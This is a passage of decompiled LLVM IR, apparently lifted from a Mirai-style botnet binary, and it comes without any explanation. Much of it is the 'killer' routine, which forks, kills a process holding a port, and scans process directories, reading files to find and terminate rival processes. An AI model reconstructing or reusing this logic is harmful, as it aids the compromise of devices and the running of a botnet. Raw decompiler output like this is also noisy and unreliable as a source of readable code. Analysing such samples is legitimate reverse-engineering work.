dec_label_pc_804dca4:                             ; preds = %dec_label_pc_804da27.backedge, %dec_label_pc_804da3d, %dec_label_pc_804da27.preheader
  %v0_804da30.lcssa = phi i32 [ %v0_804da3083, %dec_label_pc_804da27.preheader ], [ %v0_804da3086, %dec_label_pc_804da3d ], [ %v0_804da30, %dec_label_pc_804da27.backedge ]
  %v0_804dca7 = load i32, i32* @edi, align 4
  %v3_804dca7 = inttoptr i32 %v0_804da30.lcssa to i32*
  store i32 %v0_804dca7, i32* %v3_804dca7, align 4
  %v3_804dca8 = call i32 @__GI_closedir(i32* %v2_804dca8)
  store i32 %v3_804dca8, i32* %eax.global-to-local, align 4
  %v0_804dcad = load i32, i32* @esp, align 4
  %v1_804dcad = add i32 %v0_804dcad, 16
  br label %dec_label_pc_804d8e5

; uselistorder directives
  uselistorder i32 %v1_804db7e, { 2, 0, 1 }
  uselistorder i32 %v0_804da2b, { 1, 0, 2 }
  uselistorder i32 %v0_804db50, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_804db23, { 0, 2, 1 }
  uselistorder i32 %v0_804da3086, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v2_804da15, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804d99a, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_804d90e, { 0, 2, 1 }
  uselistorder i32 %v1_804d8f2, { 1, 0 }
  uselistorder i32 %v0_804d8f2, { 0, 5, 1, 2, 3, 4, 6 }
  uselistorder i32 %v0_804d8ed, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804d8e5, { 1, 0 }
  uselistorder i32 %v3_804d8bf, { 1, 0, 2 }
  uselistorder i8 %stack_var_-8769.2, { 3, 2, 5, 4, 1, 0 }
  uselistorder i32 %v1_804d87b, { 1, 0 }
  uselistorder i32 %v2_804d873, { 1, 3, 2, 4, 0 }
  uselistorder i8 %v3_804d857, { 0, 2, 1 }
  uselistorder i32 %v1_804d857, { 0, 2, 1 }
  uselistorder i32 %v1_804d813, { 2, 3, 4, 0, 1, 5, 6, 7 }
  uselistorder i32 %v7_804d810, { 0, 3, 1, 2 }
  uselistorder i32 %v0_804db7e, { 3, 2, 0, 1 }
  uselistorder i8 %stack_var_-8769.1.ph, { 3, 0, 1, 2 }
  uselistorder i32 %v1_804d7c7, { 1, 0 }
  uselistorder i32 %v1_804d7c6, { 0, 1, 3, 2 }
  uselistorder i8 %v3_804d7c3, { 0, 2, 1 }
  uselistorder i32 %v1_804d7a4, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804d76f, { 1, 2, 0 }
  uselistorder i32 %v7_804d7a7, { 1, 0, 2 }
  uselistorder i32 %v1_804d7be, { 2, 0, 1, 3 }
  uselistorder i32 %v8_804d791, { 1, 0, 3, 2 }
  uselistorder i32 %v3_804d748, { 1, 0, 2 }
  uselistorder i32 %v2_804d6ea, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v2_804d66a, { 2, 3, 5, 4, 0, 1, 6, 7 }
  uselistorder i32 %v15_804d664, { 2, 1, 3, 0 }
  uselistorder i8* %stack_var_-561, { 2, 0, 1 }
  uselistorder i32* %stack_var_-8796, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 1, 13, 14, 15, 0, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i8* %stack_var_-48, { 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-32, { 0, 1, 2, 4, 3 }
  uselistorder i8 %tmp48, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 35, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 86, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85 }
  uselistorder i32 ptrtoint (i32* @global_var_805582d.13 to i32), { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @util_stristr, { 0, 1, 2, 17, 18, 19, 20, 21, 14, 15, 16, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 (i32, i32, i32)* @util_fdgets, { 1, 2, 0 }
  uselistorder i8 7, { 3, 4, 5, 1, 2, 0, 6 }
  uselistorder label %dec_label_pc_804dc21, { 1, 0 }
  uselistorder label %dec_label_pc_804dbf8, { 1, 0 }
  uselistorder label %dec_label_pc_804da27.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804da3d, { 1, 0 }
  uselistorder label %dec_label_pc_804d8e5, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_804d897.loopexit, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d77f.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_804d767.outer.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804d810, { 1, 0 }
  uselistorder label %dec_label_pc_804d7d0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804d767.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d7a0, { 1, 0 }
  uselistorder label %dec_label_pc_804d714, { 1, 0 }
}

define i32 @killer_init() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-636 = alloca i32, align 4
  %v2_804dccc = call i32 @__GI_time(i32* null)
  store i32 %v2_804dccc, i32* %eax.global-to-local, align 4
  store i32 %v2_804dccc, i32* @esi, align 4
  %v1_804dcd3 = call i32 @__libc_fork(i32 0)
  store i32 %v1_804dcd3, i32* %eax.global-to-local, align 4
  %v12_804dcd8 = ptrtoint i32* %stack_var_-636 to i32
  store i32 %v1_804dcd3, i32* @global_var_8057d24.28, align 4
  %tmp38 = icmp slt i32 %v1_804dcd3, 1
  br i1 %tmp38, label %dec_label_pc_804dcef, label %dec_label_pc_804dce4

dec_label_pc_804dce4:                             ; preds = %dec_label_pc_804dd57, %dec_label_pc_804dcef, %entry
  %v0_804dcee = phi i32 [ 0, %dec_label_pc_804dcef ], [ %v1_804dcd3, %entry ], [ 0, %dec_label_pc_804dd57 ]
  %v0_804dce4 = phi i32 [ %v12_804dcd8, %dec_label_pc_804dcef ], [ %v12_804dcd8, %entry ], [ %v1_804dd78, %dec_label_pc_804dd57 ]
  %v1_804dce4 = add i32 %v0_804dce4, 620
  %v1_804dcea = inttoptr i32 %v1_804dce4 to i32*
  %v2_804dcea = load i32, i32* %v1_804dcea, align 4
  store i32 %v2_804dcea, i32* @ebx, align 4
  %v3_804dcea = add i32 %v0_804dce4, 624
  %v1_804dceb = inttoptr i32 %v3_804dcea to i32*
  %v2_804dceb = load i32, i32* %v1_804dceb, align 4
  store i32 %v2_804dceb, i32* @esi, align 4
  %v3_804dceb = add i32 %v0_804dce4, 628
  %v1_804dcec = inttoptr i32 %v3_804dceb to i32*
  %v2_804dcec = load i32, i32* %v1_804dcec, align 4
  store i32 %v2_804dcec, i32* @edi, align 4
  %v3_804dcec = add i32 %v0_804dce4, 632
  %v1_804dced = inttoptr i32 %v3_804dcec to i32*
  %v2_804dced = load i32, i32* %v1_804dced, align 4
  store i32 %v2_804dced, i32* @ebp, align 4
  ret i32 %v0_804dcee

dec_label_pc_804dcef:                             ; preds = %entry
  %v1_804dcef = add i32 %v1_804dcd3, 1
  %v8_804dcef = icmp eq i32 %v1_804dcef, 0
  store i32 %v1_804dcef, i32* %eax.global-to-local, align 4
  br i1 %v8_804dcef, label %dec_label_pc_804dce4, label %dec_label_pc_804dcf2

dec_label_pc_804dcf2:                             ; preds = %dec_label_pc_804dcef
  store i32 2, i32* %stack_var_-32, align 4
  %v1_804dd0f = call i32 @killer_kill_by_port(i32 20736)
  store i32 %v1_804dd0f, i32* %eax.global-to-local, align 4
  %v3_804dd17 = trunc i32 %v1_804dd0f to i8
  %v4_804dd17 = icmp eq i8 %v3_804dd17, 0
  %v1_804dd19 = icmp eq i1 %v4_804dd17, false
  br i1 %v1_804dd19, label %dec_label_pc_804dfc7, label %dec_label_pc_804dd1f

dec_label_pc_804dd1f:                             ; preds = %dec_label_pc_804dcf2, %dec_label_pc_804dfc7, %dec_label_pc_804dfeb
  store i32 400, i32* @edi, align 4
  %v1_804dd29 = call i32 @sleep(i32 5)
  store i32 %v1_804dd29, i32* %eax.global-to-local, align 4
  %v1_804dd35 = call i32 @malloc(i32 4096)
  %v2_804dd35 = inttoptr i32 %v1_804dd35 to i8*
  store i32 %v1_804dd35, i32* %eax.global-to-local, align 4
  store i32 %v1_804dd35, i32* @global_var_805a85c.29, align 4
  store i8 0, i8* %v2_804dd35, align 1
  store i32 0, i32* @global_var_8057d28.30, align 8
  br label %dec_label_pc_804dd57

dec_label_pc_804dd57:                             ; preds = %dec_label_pc_804df5b, %dec_label_pc_804dd1f
  %storemerge = phi i32 [ %v1_804df68, %dec_label_pc_804df5b ], [ %v12_804dcd8, %dec_label_pc_804dd1f ]
  %v1_804dd5a = add i32 %storemerge, -16
  %v2_804dd5a = inttoptr i32 %v1_804dd5a to i32*
  store i32 6, i32* %v2_804dd5a, align 4
  %v2_804dd5c = call i32 @table_unlock_val(i8 0)
  store i32 %v2_804dd5c, i32* %eax.global-to-local, align 4
  %v0_804dd61 = load i32, i32* @esp, align 4
  %v1_804dd61 = inttoptr i32 %v0_804dd61 to i32*
  %v2_804dd61 = load i32, i32* %v1_804dd61, align 4
  store i32 %v2_804dd61, i32* @ebx, align 4
  %v3_804dd61 = add i32 %v0_804dd61, 4
  %v1_804dd62 = inttoptr i32 %v3_804dd61 to i32*
  %v2_804dd62 = load i32, i32* %v1_804dd62, align 4
  store i32 %v2_804dd62, i32* @ebp, align 4
  store i32 0, i32* %v1_804dd62, align 4
  store i32 6, i32* %v1_804dd61, align 4
  %v3_804dd67 = call i32 @table_retrieve_val(i32 0, i32* nonnull @0)
  store i32 %v3_804dd67, i32* %eax.global-to-local, align 4
  %v1_804dd6c = load i32, i32* @esp, align 4
  %v2_804dd6c = inttoptr i32 %v1_804dd6c to i32*
  store i32 %v3_804dd67, i32* %v2_804dd6c, align 4
  %v2_804dd6f = call i32 @__GI_opendir(i8* null)
  store i32 %v2_804dd6f, i32* %eax.global-to-local, align 4
  %v1_804dd74 = load i32, i32* @esp, align 4
  %v2_804dd74 = add i32 %v1_804dd74, 36
  %v3_804dd74 = inttoptr i32 %v2_804dd74 to i32*
  store i32 %v2_804dd6f, i32* %v3_804dd74, align 4
  %v0_804dd78 = load i32, i32* @esp, align 4
  %v1_804dd78 = add i32 %v0_804dd78, 16
  %v0_804dd7b = load i32, i32* %eax.global-to-local, align 4
  %v1_804dd7b = icmp eq i32 %v0_804dd7b, 0
  br i1 %v1_804dd7b, label %dec_label_pc_804dce4, label %dec_label_pc_804dd83

dec_label_pc_804dd83:                             ; preds = %dec_label_pc_804dd57
  %v2_804dd86 = inttoptr i32 %v0_804dd78 to i32*
  store i32 6, i32* %v2_804dd86, align 4
  %v2_804dd88 = call i32 @table_lock_val(i8 0)
  store i32 %v2_804dd88, i32* %eax.global-to-local, align 4
  %v0_804dd8d = load i32, i32* @esp, align 4
  %v1_804dd8d = add i32 %v0_804dd8d, 16
  br label %dec_label_pc_804dd90

dec_label_pc_804dd90:                             ; preds = %dec_label_pc_804ddaa, %dec_label_pc_804df7e, %dec_label_pc_804df70, %dec_label_pc_804ddef, %dec_label_pc_804df9b, %dec_label_pc_804df2e, %dec_label_pc_804dd83
  %v0_804dd90 = phi i32 [ %v1_804dd8d, %dec_label_pc_804dd83 ], [ %v1_804df53, %dec_label_pc_804df2e ], [ %v1_804dfa5, %dec_label_pc_804df9b ], [ %v1_804dde1, %dec_label_pc_804ddef ], [ %v1_804dde1, %dec_label_pc_804df70 ], [ %v1_804dde1, %dec_label_pc_804df7e ], [ %v1_804dd9d, %dec_label_pc_804ddaa ]
  %v1_804dd93 = add i32 %v0_804dd90, 20
  %v2_804dd93 = inttoptr i32 %v1_804dd93 to i32*
  %v3_804dd93 = load i32, i32* %v2_804dd93, align 4
  store i32 %v3_804dd93, i32* %eax.global-to-local, align 4
  %v2_804dd97 = add i32 %v0_804dd90, -16
  %v3_804dd97 = inttoptr i32 %v2_804dd97 to i32*
  store i32 %v3_804dd93, i32* %v3_804dd97, align 4
  %v0_804dd98 = call i32 @__GI_readdir()
  store i32 %v0_804dd98, i32* %eax.global-to-local, align 4
  %v0_804dd9d = load i32, i32* @esp, align 4
  store i32 %v0_804dd98, i32* %edx.global-to-local, align 4
  %v1_804dda2 = icmp eq i32 %v0_804dd98, 0
  br i1 %v1_804dda2, label %dec_label_pc_804df5b, label %dec_label_pc_804ddaa

dec_label_pc_804ddaa:                             ; preds = %dec_label_pc_804dd90
  %v1_804dd9d = add i32 %v0_804dd9d, 16
  %v1_804ddaa = add i32 %v0_804dd98, 11
  %v2_804ddaa = inttoptr i32 %v1_804ddaa to i8*
  %v3_804ddaa = load i8, i8* %v2_804ddaa, align 1
  %v4_804ddaa = zext i8 %v3_804ddaa to i32
  %v6_804ddaa = and i32 %v0_804dd98, -256
  %v7_804ddaa = or i32 %v4_804ddaa, %v6_804ddaa
  %v1_804ddad = add i32 %v7_804ddaa, -48
  %v8_804ddad = trunc i32 %v1_804ddad to i8
  store i32 %v1_804ddad, i32* @eax, align 4
  %v8_804ddb2 = icmp ugt i8 %v8_804ddad, 9
  br i1 %v8_804ddb2, label %dec_label_pc_804dd90, label %dec_label_pc_804ddb4

dec_label_pc_804ddb4:                             ; preds = %dec_label_pc_804ddaa
  store i32 %v1_804ddaa, i32* @ebx, align 4
  %v0_804ddb7 = load i32, i32* @ecx, align 4
  %v2_804ddb7 = add i32 %v0_804dd9d, 12
  %v3_804ddb7 = inttoptr i32 %v2_804ddb7 to i32*
  store i32 %v0_804ddb7, i32* %v3_804ddb7, align 4
  %v0_804ddb8 = load i32, i32* @ecx, align 4
  %v2_804ddb8 = add i32 %v0_804dd9d, 8
  %v3_804ddb8 = inttoptr i32 %v2_804ddb8 to i32*
  store i32 %v0_804ddb8, i32* %v3_804ddb8, align 4
  %v1_804ddb9 = add i32 %v0_804dd9d, 4
  %v2_804ddb9 = inttoptr i32 %v1_804ddb9 to i32*
  store i32 10, i32* %v2_804ddb9, align 4
  %v0_804ddbb = load i32, i32* @ebx, align 4
  %v3_804ddbb = inttoptr i32 %v0_804dd9d to i32*
  store i32 %v0_804ddbb, i32* %v3_804ddbb, align 4
  %v3_804ddbc = call i32 @util_atoi(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804ddbc, i32* %eax.global-to-local, align 4
  %v0_804ddc1 = load i32, i32* @esp, align 4
  %v1_804ddc1 = add i32 %v0_804ddc1, 32
  %v2_804ddc1 = inttoptr i32 %v1_804ddc1 to i32*
  %v3_804ddc1 = load i32, i32* %v2_804ddc1, align 4
  store i32 %v3_804ddc1, i32* %edx.global-to-local, align 4
  %v2_804ddc5 = add i32 %v0_804ddc1, 40
  %v3_804ddc5 = inttoptr i32 %v2_804ddc5 to i32*
  store i32 %v3_804ddbc, i32* %v3_804ddc5, align 4
  %v0_804ddc9 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ddc9 = add i32 %v0_804ddc9, 1
  store i32 %v1_804ddc9, i32* %edx.global-to-local, align 4
  %v1_804ddca = load i32, i32* @esp, align 4
  %v2_804ddca = add i32 %v1_804ddca, 32
  %v3_804ddca = inttoptr i32 %v2_804ddca to i32*
  store i32 %v1_804ddc9, i32* %v3_804ddca, align 4
  %v0_804ddce = load i32, i32* @esp, align 4
  %v0_804ddd1 = load i32, i32* @edi, align 4
  %v2_804ddd1 = sub i32 %v0_804ddd1, %v3_804ddbc
  %v8_804ddd1 = xor i32 %v0_804ddd1, %v3_804ddbc
  %v9_804ddd1 = xor i32 %v2_804ddd1, %v0_804ddd1
  %v10_804ddd1 = and i32 %v9_804ddd1, %v8_804ddd1
  %v11_804ddd1 = icmp slt i32 %v10_804ddd1, 0
  %v13_804ddd1 = icmp slt i32 %v2_804ddd1, 0
  %v2_804ddd3 = icmp eq i1 %v13_804ddd1, %v11_804ddd1
  %v2_804ddd8 = inttoptr i32 %v0_804ddce to i32*
  store i32 0, i32* %v2_804ddd8, align 4
  %v2_804ddda = call i32 @__GI_time(i32* null)
  store i32 %v2_804ddda, i32* %eax.global-to-local, align 4
  br i1 %v2_804ddd3, label %dec_label_pc_804ddd5, label %dec_label_pc_804ddf6

dec_label_pc_804ddd5:                             ; preds = %dec_label_pc_804ddb4
  %v1_804dddf = load i32, i32* @esi, align 4
  %v2_804dddf = sub i32 %v2_804ddda, %v1_804dddf
  store i32 %v2_804dddf, i32* %eax.global-to-local, align 4
  %v0_804dde1 = load i32, i32* @esp, align 4
  %v1_804dde1 = add i32 %v0_804dde1, 16
  %v1_804dde4 = add i32 %v2_804dddf, -600
  %v6_804dde4 = sub i32 599, %v2_804dddf
  %v7_804dde4 = and i32 %v6_804dde4, %v2_804dddf
  %v8_804dde4 = icmp slt i32 %v7_804dde4, 0
  %v9_804dde4 = icmp eq i32 %v1_804dde4, 0
  %v10_804dde4 = icmp slt i32 %v1_804dde4, 0
  %v3_804dde9 = icmp ne i1 %v10_804dde4, %v8_804dde4
  %v4_804dde9 = or i1 %v9_804dde4, %v3_804dde9
  br i1 %v4_804dde9, label %dec_label_pc_804df70, label %dec_label_pc_804ddef

dec_label_pc_804ddef:                             ; preds = %dec_label_pc_804ddd5
  store i32 400, i32* @edi, align 4
  br label %dec_label_pc_804dd90

dec_label_pc_804ddf6:                             ; preds = %dec_label_pc_804ddb4
  store i32 %v2_804ddda, i32* %eax.global-to-local, align 4
  %v0_804de00 = load i32, i32* @esp, align 4
  %v1_804de00 = inttoptr i32 %v0_804de00 to i32*
  store i32 6, i32* %v1_804de00, align 4
  %v1_804de07 = load i32, i32* @esp, align 4
  %v2_804de07 = add i32 %v1_804de07, 28
  %v3_804de07 = inttoptr i32 %v2_804de07 to i32*
  store i32 %v2_804ddda, i32* %v3_804de07, align 4
  %v2_804de0b = call i32 @table_unlock_val(i8 0)
  store i32 %v2_804de0b, i32* %eax.global-to-local, align 4
  %v0_804de10 = load i32, i32* @esp, align 4
  %v1_804de10 = inttoptr i32 %v0_804de10 to i32*
  store i32 10, i32* %v1_804de10, align 4
  %v2_804de17 = call i32 @table_unlock_val(i8 0)
  store i32 %v2_804de17, i32* %eax.global-to-local, align 4
  %v0_804de1c = load i32, i32* @esp, align 4
  %v1_804de1c = inttoptr i32 %v0_804de1c to i32*
  %v3_804de1c = add i32 %v0_804de1c, 4
  %v1_804de1d = inttoptr i32 %v3_804de1c to i32*
  store i32 0, i32* %v1_804de1d, align 4
  store i32 6, i32* %v1_804de1c, align 4
  %v3_804de22 = call i32 @table_retrieve_val(i32 0, i32* nonnull @0)
  store i32 %v3_804de22, i32* %eax.global-to-local, align 4
  %v0_804de27 = load i32, i32* @esp, align 4
  %v1_804de27 = inttoptr i32 %v0_804de27 to i32*
  %v3_804de27 = add i32 %v0_804de27, 4
  %v1_804de28 = inttoptr i32 %v3_804de27 to i32*
  store i32 %v3_804de22, i32* %v1_804de28, align 4
  %v1_804de2a = add i32 %v0_804de27, 556
  store i32 %v1_804de2a, i32* @eax, align 4
  store i32 %v1_804de2a, i32* %v1_804de27, align 4
  %v3_804de32 = call i32 @util_strcpy(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804de32, i32* %eax.global-to-local, align 4
  %v0_804de37 = load i32, i32* @esp, align 4
  %v1_804de37 = add i32 %v0_804de37, 556
  store i32 %v1_804de37, i32* %edx.global-to-local, align 4
  %v2_804de3e = add i32 %v1_804de37, %v3_804de32
  store i32 %v2_804de3e, i32* @esi, align 4
  %v1_804de41 = inttoptr i32 %v0_804de37 to i32*
  %v2_804de41 = load i32, i32* %v1_804de41, align 4
  store i32 %v2_804de41, i32* @eax, align 4
  %v3_804de41 = add i32 %v0_804de37, 4
  %v1_804de42 = inttoptr i32 %v3_804de41 to i32*
  %v2_804de42 = load i32, i32* %v1_804de42, align 4
  store i32 %v2_804de42, i32* %edx.global-to-local, align 4
  %v0_804de43 = load i32, i32* @ebx, align 4
  store i32 %v0_804de43, i32* %v1_804de42, align 4
  %v0_804de44 = load i32, i32* @esi, align 4
  store i32 %v0_804de44, i32* %v1_804de41, align 4
  %v3_804de45 = call i32 @util_strcpy(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804de45, i32* %eax.global-to-local, align 4
  %v0_804de4a = load i32, i32* @esp, align 4
  %v1_804de4a = inttoptr i32 %v0_804de4a to i32*
  %v3_804de4a = add i32 %v0_804de4a, 4
  store i32 %v3_804de45, i32* @ebx, align 4
  %v1_804de4d = inttoptr i32 %v3_804de4a to i32*
  %v2_804de4d = load i32, i32* %v1_804de4d, align 4
  store i32 %v2_804de4d, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804de4d, align 4
  store i32 10, i32* %v1_804de4a, align 4
  %v3_804de52 = call i32 @table_retrieve_val(i32 0, i32* nonnull @0)
  store i32 %v3_804de52, i32* %eax.global-to-local, align 4
  %v0_804de57 = load i32, i32* @esp, align 4
  %v1_804de57 = inttoptr i32 %v0_804de57 to i32*
  %v3_804de57 = add i32 %v0_804de57, 4
  %v1_804de58 = inttoptr i32 %v3_804de57 to i32*
  %v2_804de58 = load i32, i32* %v1_804de58, align 4
  store i32 %v2_804de58, i32* @edi, align 4
  store i32 %v3_804de52, i32* %v1_804de58, align 4
  %v0_804de5a = load i32, i32* @ebx, align 4
  %v1_804de5a = load i32, i32* @esi, align 4
  %v2_804de5a = add i32 %v1_804de5a, %v0_804de5a
  store i32 %v2_804de5a, i32* @eax, align 4
  store i32 %v2_804de5a, i32* %v1_804de57, align 4
  %v3_804de5e = call i32 @util_strcpy(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804de5e, i32* %eax.global-to-local, align 4
  %v0_804de63 = load i32, i32* @esp, align 4
  %v1_804de63 = inttoptr i32 %v0_804de63 to i32*
  store i32 6, i32* %v1_804de63, align 4
  %v2_804de6a = call i32 @table_lock_val(i8 0)
  store i32 %v2_804de6a, i32* %eax.global-to-local, align 4
  %v0_804de6f = load i32, i32* @esp, align 4
  %v1_804de6f = inttoptr i32 %v0_804de6f to i32*
  store i32 10, i32* %v1_804de6f, align 4
  %v2_804de76 = call i32 @table_lock_val(i8 0)
  store i32 %v2_804de76, i32* %eax.global-to-local, align 4
  %v0_804de7b = load i32, i32* @esp, align 4
  %v1_804de7b = inttoptr i32 %v0_804de7b to i32*
  %v2_804de7b = load i32, i32* %v1_804de7b, align 4
  store i32 %v2_804de7b, i32* %eax.global-to-local, align 4
  %v3_804de7b = add i32 %v0_804de7b, 4
  %v1_804de7c = inttoptr i32 %v3_804de7b to i32*
  %v2_804de7c = load i32, i32* %v1_804de7c, align 4
  store i32 %v2_804de7c, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_804de7c, align 4
  %v1_804de7f = add i32 %v0_804de7b, 556
  store i32 %v1_804de7f, i32* @eax, align 4
  store i32 %v1_804de7f, i32* %v1_804de7b, align 4
  %v2_804de87 = call i32 @__libc_open(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804de87, i32* %eax.global-to-local, align 4
  %v0_804de8c = load i32, i32* @esp, align 4
  store i32 %v2_804de87, i32* @ebp, align 4
  %v10_804de91 = icmp eq i32 %v2_804de87, -1
  br i1 %v10_804de91, label %dec_label_pc_804df2e, label %dec_label_pc_804de9a

dec_label_pc_804de9a:                             ; preds = %dec_label_pc_804ddf6
  %v2_804de9d = inttoptr i32 %v0_804de8c to i32*
  store i32 62, i32* %v2_804de9d, align 4
  %v2_804de9f = call i32 @table_unlock_val(i8 0)
  store i32 %v2_804de9f, i32* @eax, align 4
  %v0_804dea4 = load i32, i32* @esp, align 4
  %v1_804dea4 = add i32 %v0_804dea4, 16
  br label %dec_label_pc_804dea7

dec_label_pc_804dea7:                             ; preds = %dec_label_pc_804dec5, %dec_label_pc_804df03, %dec_label_pc_804deee, %dec_label_pc_804de9a
  %v1_804dea7 = phi i32 [ %v1_804dea4, %dec_label_pc_804de9a ], [ %v1_804dee5, %dec_label_pc_804deee ], [ %v1_804dee5, %dec_label_pc_804df03 ], [ %v1_804dee5, %dec_label_pc_804dec5 ]
  %v0_804dea7 = load i32, i32* @ecx, align 4
  %v2_804dea7 = add i32 %v1_804dea7, -4
  %v3_804dea7 = inttoptr i32 %v2_804dea7 to i32*
  store i32 %v0_804dea7, i32* %v3_804dea7, align 4
  %v1_804dea8 = add i32 %v1_804dea7, -8
  %v2_804dea8 = inttoptr i32 %v1_804dea8 to i32*
  store i32 512, i32* %v2_804dea8, align 4
  %v1_804dead = add i32 %v1_804dea7, 28
  store i32 %v1_804dead, i32* %edx.global-to-local, align 4
  %v2_804deb1 = add i32 %v1_804dea7, -12
  %v3_804deb1 = inttoptr i32 %v2_804deb1 to i32*
  store i32 %v1_804dead, i32* %v3_804deb1, align 4
  %v0_804deb2 = load i32, i32* @ebp, align 4
  %v2_804deb2 = add i32 %v1_804dea7, -16
  %v3_804deb2 = inttoptr i32 %v2_804deb2 to i32*
  store i32 %v0_804deb2, i32* %v3_804deb2, align 4
  %v3_804deb3 = call i32 @__libc_read(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804deb3, i32* %eax.global-to-local, align 4
  %v0_804deb8 = load i32, i32* @esp, align 4
  store i32 %v3_804deb3, i32* @ebx, align 4
  %tmp39 = icmp slt i32 %v3_804deb3, 1
  br i1 %tmp39, label %dec_label_pc_804dfad, label %dec_label_pc_804dec5

dec_label_pc_804dec5:                             ; preds = %dec_label_pc_804dea7
  %v2_804dec5 = add i32 %v0_804deb8, 12
  %v3_804dec5 = inttoptr i32 %v2_804dec5 to i32*
  store i32 %v3_804deb3, i32* %v3_804dec5, align 4
  %v2_804dec6 = add i32 %v0_804deb8, 8
  %v3_804dec6 = inttoptr i32 %v2_804dec6 to i32*
  store i32 %v3_804deb3, i32* %v3_804dec6, align 4
  %v1_804dec7 = add i32 %v0_804deb8, 4
  %v2_804dec7 = inttoptr i32 %v1_804dec7 to i32*
  store i32 0, i32* %v2_804dec7, align 4
  %v2_804dec9 = inttoptr i32 %v0_804deb8 to i32*
  store i32 62, i32* %v2_804dec9, align 4
  %v3_804decb = call i32 @table_retrieve_val(i32 0, i32* nonnull @0)
  store i32 %v3_804decb, i32* %eax.global-to-local, align 4
  %v1_804ded0 = load i32, i32* @esp, align 4
  %v2_804ded0 = inttoptr i32 %v1_804ded0 to i32*
  store i32 %v3_804decb, i32* %v2_804ded0, align 4
  %v2_804ded3 = call i32 @util_strlen(i8* null)
  store i32 %v2_804ded3, i32* %eax.global-to-local, align 4
  %v0_804ded8 = load i32, i32* @esp, align 4
  %v1_804ded8 = inttoptr i32 %v0_804ded8 to i32*
  %v3_804ded8 = add i32 %v0_804ded8, 4
  store i32 %v2_804ded3, i32* @edi, align 4
  %v1_804dedb = inttoptr i32 %v3_804ded8 to i32*
  %v2_804dedb = load i32, i32* %v1_804dedb, align 4
  store i32 %v2_804dedb, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804dedb, align 4
  store i32 62, i32* %v1_804ded8, align 4
  %v3_804dee0 = call i32 @table_retrieve_val(i32 0, i32* nonnull @0)
  store i32 %v3_804dee0, i32* @eax, align 4
  %v0_804dee5 = load i32, i32* @esp, align 4
  %v1_804dee5 = add i32 %v0_804dee5, 16
  store i32 %v3_804dee0, i32* @esi, align 4
  %v0_804deea = load i32, i32* @ebx, align 4
  %v1_804deea = load i32, i32* @edi, align 4
  %v5_804deec = icmp slt i32 %v0_804deea, %v1_804deea
  br i1 %v5_804deec, label %dec_label_pc_804dea7, label %dec_label_pc_804deee

dec_label_pc_804deee:                             ; preds = %dec_label_pc_804dec5
  %v1_804deee = add i32 %v0_804dee5, 44
  store i32 %v1_804deee, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v1_804def441 = add i32 %v0_804deea, -1
  store i32 %v1_804def441, i32* @ebx, align 4
  %v10_804def542 = icmp eq i32 %v0_804deea, 0
  br i1 %v10_804def542, label %dec_label_pc_804dea7, label %dec_label_pc_804defa

dec_label_pc_804defa:                             ; preds = %dec_label_pc_804deee, %dec_label_pc_804df03
  %v1_804def446 = phi i32 [ %v1_804def4, %dec_label_pc_804df03 ], [ %v1_804def441, %dec_label_pc_804deee ]
  %v0_804df0345 = phi i32 [ %v1_804df03, %dec_label_pc_804df03 ], [ %v1_804deee, %dec_label_pc_804deee ]
  %v4_804defa44 = phi i32 [ %v6_804defa, %dec_label_pc_804df03 ], [ %v3_804dee0, %dec_label_pc_804deee ]
  %v0_804df0643 = phi i32 [ %v3_804defc19, %dec_label_pc_804df03 ], [ 0, %dec_label_pc_804deee ]
  %v1_804defa = inttoptr i32 %v0_804df0345 to i8*
  %v2_804defa = load i8, i8* %v1_804defa, align 1
  %v3_804defa = zext i8 %v2_804defa to i32
  %v5_804defa = and i32 %v4_804defa44, -256
  %v6_804defa = or i32 %v3_804defa, %v5_804defa
  store i32 %v6_804defa, i32* @eax, align 4
  %v4_804defc = add i32 %v0_804df0643, %v3_804dee0
  %v5_804defc = inttoptr i32 %v4_804defc to i8*
  %v6_804defc = load i8, i8* %v5_804defc, align 1
  %v17_804defc = icmp eq i8 %v2_804defa, %v6_804defc
